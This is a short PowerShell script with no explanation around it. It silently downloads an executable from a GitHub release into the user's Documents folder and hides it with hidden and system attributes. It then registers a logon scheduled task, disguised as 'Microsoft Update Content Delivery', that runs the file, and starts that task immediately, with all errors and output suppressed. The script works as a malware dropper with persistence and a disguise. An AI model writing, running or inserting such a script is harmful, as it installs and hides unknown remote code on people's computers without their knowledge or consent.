Clear-Host
$downloadUrl = "https://github.com/sevcator/mango-mango-mango/releases/download/1/MANGO.exe"
$destinationPath = "$env:USERPROFILE\Documents\mango.exe"
Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath -ErrorAction SilentlyContinue > $null 2>&1
attrib +h +s $destinationPath > $null 2>&1
$taskName = "Microsoft Update Content Delivery"
$action = New-ScheduledTaskAction -Execute $destinationPath
$trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $env:USERNAME -ErrorAction SilentlyContinue > $null 2>&1
Start-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue > $null 2>&1
exit
